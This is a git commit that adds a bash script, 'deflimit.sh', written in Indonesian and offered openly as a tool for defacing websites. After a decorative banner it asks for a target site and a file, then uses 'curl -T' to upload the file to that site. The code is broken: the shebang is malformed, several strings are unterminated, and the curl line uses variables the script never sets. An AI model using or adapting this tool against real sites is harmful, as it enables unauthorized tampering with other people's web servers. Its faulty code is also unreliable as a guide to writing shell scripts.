b31c7c6098eb38480e2dbbe0541fc32caa64cb83
cyberlimit <64591373+cyberlimit@users.noreply.github.com>
2020-05-28 02:10:58 +0700

    Create deflimit.sh

---
+++ deflimit.sh
@@ -0,0 +1,59 @@
+/bin/bash
+#Deface
+#tools by cyber limit
+
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+
+sleep 1
+clear
+echo ""
+echo -e "\e[1;34m   _______                >"
+sleep 1
+echo -e "\e[1;34m  (       )               >"
+sleep 1
+echo -e "\e[1;34m  | [] [] |    Hii,       >"
+sleep 1
+echo -e "\e[1;34m  |   _   |    Welcome To >"
+sleep 1
+echo -e "\e[1;34m _(_______)_   DEFACE  :) >"
+sleep 1
+echo -e "\e[1;34m(    \ /    )             >"
+sleep 1
+echo -e "\e[1;34m| (   |   ) |              "
+sleep 1
+echo -e "\e[1;34m| |   .   | |   CyberLimit>"
+sleep 1
+echo -e "\e[1;34m| |   .   | | "
+sleep 1
+echo -e "\e[1;34m|_(_______)_|"
+echo ""
+echo -e "\e[1;35m      №№№№№№№№№№№№№№№№№№№№№№№№№№№№№№>
+echo -e "\e[1;36m      №|-----Autor : Cyber Limit---->
+echo -e "\e[1;36m      №|---My Team : Wisnu | panjull>
+echo -e "\e[1;36m      №|---youtube : Cyber Limit---->
+echo -e "\e[1;36m      №|-------Tampilan Sederhana--->
+echo -e "\e[1;35m      №№№№№№№№№№№№№№№№№№№№№№№№№№№№№№>
+echo ""
+echo "NOTE : HARGAI YANG MEMBUAT!!"
+sleep 1
+echo ""
+echo "JANGAN SALAH GUNAKAN TOOLS"
+sleep 1
+echo ""
+echo -e "\e[1;31mPASTIKAN FILE DI LUAR SDCARD"
+sleep 1
+echo ""
+read -p "MASUKAN WEB TARGET : " pil
+sleep 1
+echo ""
+read -p "MASUKAN FILE KAMU : " pil
+sleep 1
+echo "Please Wait..."
+sleep 3
+curl -T /sdcard/$target $file
